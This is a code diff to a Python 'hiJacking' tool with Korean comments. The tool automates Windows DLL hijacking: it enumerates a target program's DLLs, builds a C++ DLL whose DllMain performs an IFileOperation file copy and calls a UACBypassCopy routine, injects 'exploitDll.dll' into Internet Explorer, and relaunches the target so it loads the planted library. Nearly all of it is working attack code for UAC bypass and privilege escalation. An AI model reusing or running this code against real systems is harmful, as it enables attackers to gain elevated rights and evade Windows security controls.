@@ -187,113 +187,30 @@ class hiJacking():
         
         explore_pid = self.create_process("C:/Program Files/Internet Explorer/iexplore.exe")
         exe_pid = self.create_process(exe_path)
+        # DLL 리스트 파싱 후 원활한 파일 이동을 위해 프로세스 종료
         program_name, list_dlls = self.list_dll(exe_pid)
+        psutil.Process(exe_pid).kill()
         # #2. IFileOperation 코드에 원하는 인자를 세팅 후 빌드 하기
         
-        dll_code = """
-                        #include <windows.h>
-                        #include <iostream>
-                        #include <shobjidl.h>
-
-                        using namespace std;
-
-                        void hello() {
-                            AllocConsole();
-                            freopen("CONOUT$", "w", stdout);
-                            cout << "Hello, World!" << endl;
-                        }
-
-                        HRESULT CopyItem(__in PCWSTR pszSrcItem, __in PCWSTR pszDest, PCWSTR pszNewName)
-                        {
-                            //
-                            // Initialize COM as STA.
-                            //
-                            HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE); 
-                            if (SUCCEEDED(hr))
-                            {
-                                IFileOperation *pfo;
-                        
-                                //
-                                // Create the IFileOperation interface 
-                                //
-                                hr = CoCreateInstance(CLSID_FileOperation, 
-                                                    NULL, 
-                                                    CLSCTX_ALL, 
-                                                    IID_PPV_ARGS(&pfo));
-                                if (SUCCEEDED(hr))
-                                {
-                                    //
-                                    // Set the operation flags. Turn off all UI from being shown to the
-                                    // user during the operation. This includes error, confirmation,
-                                    // and progress dialogs.
-                                    //
-                                    hr = pfo->SetOperationFlags(FOF_NO_UI);
-                                    if (SUCCEEDED(hr))
-                                    {
-                                        //
-                                        // Create an IShellItem from the supplied source path.
-                                        //
-                                        IShellItem *psiFrom = NULL;
-                                        hr = SHCreateItemFromParsingName(pszSrcItem, 
-                                                                        NULL, 
-                                                                        IID_PPV_ARGS(&psiFrom));
-                                        if (SUCCEEDED(hr))
-                                        {
-                                            IShellItem *psiTo = NULL;
-                        
-                                            if (NULL != pszDest)
-                                            {
-                                                //
-                                                // Create an IShellItem from the supplied 
-                                                // destination path.
-                                                //
-                                                hr = SHCreateItemFromParsingName(pszDest, 
-                                                                                NULL, 
-                                                                                IID_PPV_ARGS(&psiTo));
-                                            }
-                                            
-                                            if (SUCCEEDED(hr))
-                                            {
-                                                //
-                                                // Add the operation
-                                                //
-                                                hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);
-
-                                                if (NULL != psiTo)
-                                                {
-                                                    psiTo->Release();
-                                                }
-                                            }
-                                            
-                                            psiFrom->Release();
-                                        }
-                                        
-                                        if (SUCCEEDED(hr))
-                                        {
-                                            //
-                                            // Perform the operation to copy the file.
-                                            //
-                                            hr = pfo->PerformOperations();
-                                        }        
-                                    }
-                                    
-                                    //
-                                    // Release the IFileOperation interface.
-                                    //
-                                    pfo->Release();
-                                }
-                        
-                                CoUninitialize();
-                            }
-                            return hr;
-                        }
-
-                        bool __stdcall DllMain(HMODULE /*module*/, DWORD reason, LPVOID /*reserved*/) {
-                            if (reason == DLL_PROCESS_ATTACH) hello();
-                            return true;
-                        }
-                    """
-        
+        dll_code = """bool __stdcall DllMain(HMODULE /*module*/, DWORD reason, LPVOID /*reserved*/) {
+    if (reason == DLL_PROCESS_ATTACH){
+        PCWSTR srcPath = L"%s";
+        PCWSTR desPath = L"%s";
+        PCWSTR FileName = L"%s";
+        HRESULT res2 = CopyItem(srcPath, desPath, FileName);
+        AllocConsole();
+        FILE* fp = freopen("CONOUT$", "w", stdout);
+        //cout << res << endl;
+        cout << res2 << endl;
+    }
+    if(reason == DLL_THREAD_ATTACH){
+        bool res =  UACBypassCopy();
+        AllocConsole();
+        freopen("CONOUT$", "w", stdout);
+        cout << res << endl;
+    }
+    return true;
+}"""
         
         
         # #3. 수정 완료한 dll.cpp를 Cmake를 이용하여 빌드(종속성 에러 때문에 Cmake 설치 요구 표시)
@@ -316,7 +233,6 @@ class hiJacking():
         # 6. 불필요한 프로세스 종료 후 하이제킹한 DLL 이 로드 될 수 있도록 실행
         psutil.Process(explore_pid).kill()
         
-        psutil.Process(exe_pid).kill()
         
         hijacked_pid = self.create_process(exe_path)
         
@@ -373,7 +289,7 @@ if __name__=='__main__':
     # for i,j in success.items():
     #     print(i,j)
     os.system("cd CreateIFileOperationDLL && .\Build.bat")
-    time.sleep(5)
+    time.sleep(2)
     explore_pid = dll_hijact.create_process("C:/Program Files/Internet Explorer/iexplore.exe")
     inject(explore_pid,"CreateIFileOperationDLL\Debug\exploitDll.dll")    
     os.remove("CreateIFileOperationDLL\CMakeCache.txt")
